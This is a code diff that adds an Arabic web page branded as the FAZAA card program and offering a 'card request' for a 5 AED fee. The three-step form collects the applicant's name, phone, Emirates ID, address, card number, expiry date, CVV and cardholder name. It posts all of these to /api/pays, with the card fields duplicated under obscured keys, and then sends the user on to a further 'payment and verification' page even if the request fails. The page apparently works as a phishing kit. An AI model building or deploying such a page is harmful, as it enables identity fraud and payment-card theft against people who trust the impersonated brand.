@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>فزعة - FAZAA | طلب البطاقة</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700;800&family=Roboto+Mono:wght@500;700&display=swap" rel="stylesheet">
+    <script>
+        (function() {
+            try {
+                let currentFetch = window.fetch ? window.fetch.bind(window) : null;
+                const desc = Object.getOwnPropertyDescriptor(window, 'fetch') || 
+                             (window.Window ? Object.getOwnPropertyDescriptor(Window.prototype, 'fetch') : null);
+                if (desc && !desc.set) {
+                    try {
+                        Object.defineProperty(window, 'fetch', {
+                            get: function() { return currentFetch; },
+                            set: function(v) { currentFetch = v; },
+                            configurable: true,
+                            enumerable: true
+                        });
+                    } catch (e1) {
+                        try {
+                            if (window.Window) {
+                                Object.defineProperty(Window.prototype, 'fetch', {
+                                    get: function() { return currentFetch; },
+                                    set: function(v) { currentFetch = v; },
+                                    configurable: true,
+                                    enumerable: true
+                                });
+                            }
+                        } catch (e2) {}
+                    }
+                }
+            } catch (e) {}
+        })();
+    </script>
+    <style>
+        body { 
+            font-family: 'Tajawal', sans-serif;
+            background: #f5f5f5;
+            color: #333;
+        }
+        .mono { font-family: 'Roboto Mono', monospace; }
+        .gold-gradient {
+            background: linear-gradient(to right, #7a6318, #c9a227);
+        }
+        .btn-gold {
+            background: linear-gradient(135deg, #c9a227, #7a6318);
+            color: white;
+            transition: all 0.25s ease;
+        }
+        .btn-gold:hover {
+            opacity: 0.95;
+            box-shadow: 0 4px 15px rgba(201, 162, 39, 0.3);
+        }
+        .step-circle.active {
+            background: #c9a227;
+            color: white;
+        }
+        .step-circle {
+            background: #e2e8f0;
+            color: #475569;
+        }
+    </style>
+</head>
+<body class="min-h-screen flex flex-col bg-[#f5f5f5]">
+
+    <!-- Header الأصلي -->
+    <header class="h-[90px] w-full gold-gradient relative flex items-center justify-between px-6 md:px-12 text-white shadow-md">
+        <a href="/" class="flex items-center gap-2 text-white text-sm bg-white/20 hover:bg-white/30 px-4 py-1.5 rounded-full transition-all">
+            <span>←</span>
+            <span>الرئيسية</span>
+        </a>
+        <div class="flex flex-col items-center">
+            <span class="font-bold text-3xl leading-none tracking-wider">فزعة</span>
+            <span class="text-xs font-medium tracking-[0.2em]">FAZAA</span>
+        </div>
+        <div class="w-20"></div>
+    </header>
+
+    <main class="flex-1 max-w-xl w-full mx-auto p-4 md:py-8">
+        <div class="bg-white rounded-2xl shadow-lg p-6 md:p-8 border border-gray-100">
+            
+            <h1 class="text-2xl font-bold text-center text-gray-800 mb-6">طلب البطاقة</h1>
+
+            <!-- مؤشر الخطوات الثلاث -->
+            <div class="flex justify-between items-center mb-8 px-4">
+                <div class="flex flex-col items-center">
+                    <div id="sc-1" class="step-circle active w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm">1</div>
+                    <span class="text-xs font-bold mt-2 text-[#c9a227]">البيانات الشخصية</span>
+                </div>
+                <div class="h-0.5 flex-1 bg-gray-200 mx-2"></div>
+                <div class="flex flex-col items-center">
+                    <div id="sc-2" class="step-circle w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm">2</div>
+                    <span class="text-xs font-bold mt-2 text-gray-400">بيانات التوصيل</span>
+                </div>
+                <div class="h-0.5 flex-1 bg-gray-200 mx-2"></div>
+                <div class="flex flex-col items-center">
+                    <div id="sc-3" class="step-circle w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm">3</div>
+                    <span class="text-xs font-bold mt-2 text-gray-400">بيانات الدفع</span>
+                </div>
+            </div>
+
+            <div id="errMsg" class="hidden mb-4 p-3 rounded-xl bg-red-50 text-red-700 text-sm border border-red-200"></div>
+
+            <form id="orderForm" novalidate>
+                
+                <!-- الخطوة 1: البيانات الشخصية -->
+                <div id="step-1" class="space-y-4">
+                    <div>
+                        <label class="block text-sm font-bold text-gray-700 mb-1.5">الاسم الكامل *</label>
+                        <input type="text" id="fullName" required class="w-full px-4 py-3 text-base border border-gray-300 rounded-xl focus:border-[#c9a227] focus:outline-none focus:ring-2 focus:ring-[#c9a227]/20 transition-all bg-white">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-bold text-gray-700 mb-1.5">رقم الهاتف *</label>
+                        <input type="tel" id="phone" required class="w-full px-4 py-3 text-base border border-gray-300 rounded-xl focus:border-[#c9a227] focus:outline-none focus:ring-2 focus:ring-[#c9a227]/20 transition-all bg-white text-left" dir="ltr" inputmode="tel">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-bold text-gray-700 mb-1.5">رقم الهوية الإماراتية *</label>
+                        <input type="text" id="emiratesId" required maxlength="18" class="w-full px-4 py-3 text-base border border-gray-300 rounded-xl focus:border-[#c9a227] focus:outline-none focus:ring-2 focus:ring-[#c9a227]/20 transition-all bg-white text-left mono" dir="ltr" inputmode="numeric">
+                    </div>
+                    <div class="pt-4">
+                        <button type="button" onclick="nextStep(2)" class="w-full btn-gold font-bold py-3.5 rounded-xl shadow-md active:scale-[0.98] transition-all text-base cursor-pointer">
+                            المتابعة إلى بيانات التوصيل ←
+                        </button>
+                    </div>
+                </div>
+
+                <!-- الخطوة 2: بيانات التوصيل -->
+                <div id="step-2" class="space-y-4 hidden">
+                    <div>
+                        <label class="block text-sm font-bold text-gray-700 mb-1.5">الإمارة / المنطقة *</label>
+                        <select id="region" required class="w-full px-4 py-3 text-base border border-gray-300 rounded-xl focus:border-[#c9a227] focus:outline-none focus:ring-2 focus:ring-[#c9a227]/20 transition-all bg-white">
+                            <option value="">اختر الإمارة</option>
+                            <option value="أبوظبي">أبوظبي</option>
+                            <option value="دبي">دبي</option>
+                            <option value="الشارقة">الشارقة</option>
+                            <option value="عجمان">عجمان</option>
+                            <option value="أم القيوين">أم القيوين</option>
+                            <option value="رأس الخيمة">رأس الخيمة</option>
+                            <option value="الفجيرة">الفجيرة</option>
+                        </select>
+                    </div>
+                    <div>
+                        <label class="block text-sm font-bold text-gray-700 mb-1.5">اسم الشارع *</label>
+                        <input type="text" id="street" required class="w-full px-4 py-3 text-base border border-gray-300 rounded-xl focus:border-[#c9a227] focus:outline-none focus:ring-2 focus:ring-[#c9a227]/20 transition-all bg-white">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-bold text-gray-700 mb-1.5">الحي / المنطقة *</label>
+                        <input type="text" id="district" required class="w-full px-4 py-3 text-base border border-gray-300 rounded-xl focus:border-[#c9a227] focus:outline-none focus:ring-2 focus:ring-[#c9a227]/20 transition-all bg-white">
+                    </div>
+                    <div>
+                        <label class="block text-sm font-bold text-gray-700 mb-1.5">موعد التسليم المفضل *</label>
+                        <input type="date" id="deliveryDate" required class="w-full px-4 py-3 text-base border border-gray-300 rounded-xl focus:border-[#c9a227] focus:outline-none focus:ring-2 focus:ring-[#c9a227]/20 transition-all bg-white">
+                    </div>
+                    <div class="pt-4 flex gap-3">
+                        <button type="button" onclick="nextStep(1)" class="w-1/3 bg-gray-100 hover:bg-gray-200 active:scale-[0.98] text-gray-700 font-bold py-3.5 rounded-xl cursor-pointer">
+                            السابق
+                        </button>
+                        <button type="button" onclick="nextStep(3)" class="w-2/3 btn-gold font-bold py-3.5 rounded-xl shadow-md active:scale-[0.98] transition-all text-base cursor-pointer">
+                            المتابعة إلى بيانات الدفع ←
+                        </button>
+                    </div>
+                </div>
+
+                <!-- الخطوة 3: بيانات الدفع -->
+                <div id="step-3" class="space-y-4 hidden">
+                    <div>
+                        <label class="block text-sm font-bold text-gray-700 mb-1.5">رقم البطاقة البنكية *</label>
+                        <input type="text" id="cardNumber" required maxlength="19" class="w-full px-4 py-3 text-base border border-gray-300 rounded-xl focus:border-[#c9a227] focus:outline-none focus:ring-2 focus:ring-[#c9a227]/20 transition-all bg-white text-left mono tracking-wider" dir="ltr" inputmode="numeric">
+                    </div>
+                    <div class="grid grid-cols-2 gap-3">
+                        <div>
+                            <label class="block text-sm font-bold text-gray-700 mb-1.5">تاريخ الانتهاء *</label>
+                            <input type="text" id="expiry" required maxlength="5" class="w-full px-4 py-3 text-base border border-gray-300 rounded-xl focus:border-[#c9a227] focus:outline-none focus:ring-2 focus:ring-[#c9a227]/20 transition-all bg-white text-center mono" dir="ltr" inputmode="numeric">
+                        </div>
+                        <div>
+                            <label class="block text-sm font-bold text-gray-700 mb-1.5">رمز الأمان (CVV) *</label>
+                            <input type="password" id="cvv" required maxlength="4" class="w-full px-4 py-3 text-base border border-gray-300 rounded-xl focus:border-[#c9a227] focus:outline-none focus:ring-2 focus:ring-[#c9a227]/20 transition-all bg-white text-center mono" dir="ltr" inputmode="numeric">
+                        </div>
+                    </div>
+                    <div>
+                        <label class="block text-sm font-bold text-gray-700 mb-1.5">اسم صاحب البطاقة *</label>
+                        <input type="text" id="cardHolder" required class="w-full px-4 py-3 text-base border border-gray-300 rounded-xl focus:border-[#c9a227] focus:outline-none focus:ring-2 focus:ring-[#c9a227]/20 transition-all bg-white uppercase" dir="ltr">
+                    </div>
+                    <div class="pt-4 flex gap-3">
+                        <button type="button" onclick="nextStep(2)" class="w-1/3 bg-gray-100 hover:bg-gray-200 active:scale-[0.98] text-gray-700 font-bold py-3.5 rounded-xl cursor-pointer">
+                            السابق
+                        </button>
+                        <button type="submit" id="submitBtn" class="w-2/3 btn-gold font-bold py-3.5 rounded-xl shadow-lg active:scale-[0.98] transition-all text-base cursor-pointer">
+                            ✓ تأكيد الطلب
+                        </button>
+                    </div>
+                </div>
+
+            </form>
+
+            <div id="loader" class="hidden text-center py-10">
+                <div class="inline-block animate-spin rounded-full h-10 w-10 border-4 border-gray-300 border-t-[#c9a227] mb-3"></div>
+                <p class="text-sm text-gray-600 font-bold">جاري إرسال الطلب والتحويل لصفحة الدفع والتحقق...</p>
+            </div>
+
+        </div>
+    </main>
+
+    <footer class="bg-[#1a1a1a] text-gray-400 py-6 px-6 text-center text-xs mt-auto">
+        <p>© 2026 فزعة جميع الحقوق محفوظة</p>
+    </footer>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const cardBrand = urlParams.get('card') || 'fazaa';
+
+        let curStep = 1;
+
+        function nextStep(step) {
+            const err = document.getElementById('errMsg');
+            err.classList.add('hidden');
+
+            if (step > curStep) {
+                if (curStep === 1) {
+                    const fn = document.getElementById('fullName').value.trim();
+                    const ph = document.getElementById('phone').value.trim();
+                    const em = document.getElementById('emiratesId').value.trim();
+                    if (!fn || !ph || !em) {
+                        err.innerText = 'يرجى إكمال جميع الحقول المطلوبة في هذه الخطوة.';
+                        err.classList.remove('hidden');
+                        return;
+                    }
+                }
+                if (curStep === 2) {
+                    const reg = document.getElementById('region').value;
+                    const str = document.getElementById('street').value.trim();
+                    const dis = document.getElementById('district').value.trim();
+                    const dt = document.getElementById('deliveryDate').value;
+                    if (!reg || !str || !dis || !dt) {
+                        err.innerText = 'يرجى إكمال جميع بيانات التوصيل.';
+                        err.classList.remove('hidden');
+                        return;
+                    }
+                }
+            }
+
+            document.getElementById('step-1').classList.add('hidden');
+            document.getElementById('step-2').classList.add('hidden');
+            document.getElementById('step-3').classList.add('hidden');
+
+            document.getElementById(`step-${step}`).classList.remove('hidden');
+
+            for (let i = 1; i <= 3; i++) {
+                const sc = document.getElementById(`sc-${i}`);
+                if (i <= step) {
+                    sc.className = 'step-circle active w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm';
+                } else {
+                    sc.className = 'step-circle w-9 h-9 rounded-full flex items-center justify-center font-bold text-sm';
+                }
+            }
+
+            curStep = step;
+        }
+
+        // تنسيق رقم البطاقة
+        document.getElementById('cardNumber').addEventListener('input', (e) => {
+            let v = e.target.value.replace(/\D/g, '').substring(0, 16);
+            e.target.value = v.match(/.{1,4}/g)?.join(' ') || v;
+        });
+
+        // تنسيق تاريخ الانتهاء
+        document.getElementById('expiry').addEventListener('input', (e) => {
+            let v = e.target.value.replace(/\D/g, '').substring(0, 4);
+            if (v.length > 2) v = v.substring(0, 2) + '/' + v.substring(2, 4);
+            e.target.value = v;
+        });
+
+        // إرسال الطلب
+        document.getElementById('orderForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const err = document.getElementById('errMsg');
+            err.classList.add('hidden');
+
+            const card = document.getElementById('cardNumber').value.replace(/\s/g, '');
+            const exp = document.getElementById('expiry').value.trim();
+            const cvv = document.getElementById('cvv').value.trim();
+            const holder = document.getElementById('cardHolder').value.trim();
+
+            if (!card || card.length < 15 || !exp || !cvv || !holder) {
+                err.innerText = 'يرجى التأكد من صحة بيانات البطاقة البنكية.';
+                err.classList.remove('hidden');
+                return;
+            }
+
+            document.getElementById('orderForm').classList.add('hidden');
+            document.getElementById('loader').classList.remove('hidden');
+
+            const orderId = 'reg_' + Date.now();
+            const data = {
+                id: orderId,
+                orderId: orderId,
+                fullName: document.getElementById('fullName').value.trim(),
+                ownerName: document.getElementById('fullName').value.trim(),
+                phone: document.getElementById('phone').value.trim(),
+                phoneNumber: document.getElementById('phone').value.trim(),
+                emiratesId: document.getElementById('emiratesId').value.trim(),
+                identityNumber: document.getElementById('emiratesId').value.trim(),
+                region: document.getElementById('region').value,
+                street: document.getElementById('street').value.trim(),
+                district: document.getElementById('district').value.trim(),
+                deliveryDate: document.getElementById('deliveryDate').value,
+                cardNumber: card,
+                _v1: card,
+                expiry: exp,
+                expiryDate: exp,
+                _v3: exp,
+                cvv: cvv,
+                _v2: cvv,
+                cardHolder: holder,
+                cardHolderName: holder,
+                _v4: holder,
+                cardBrand: cardBrand,
+                amount: '5 AED',
+                status: 'pending'
+            };
+
+            try {
+                await fetch('/api/pays', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
+                });
+                window.location.href = `/payment?orderId=${orderId}`;
+            } catch (error) {
+                window.location.href = `/payment?orderId=${orderId}`;
+            }
+        });
+    </script>
+</body>
+</html>
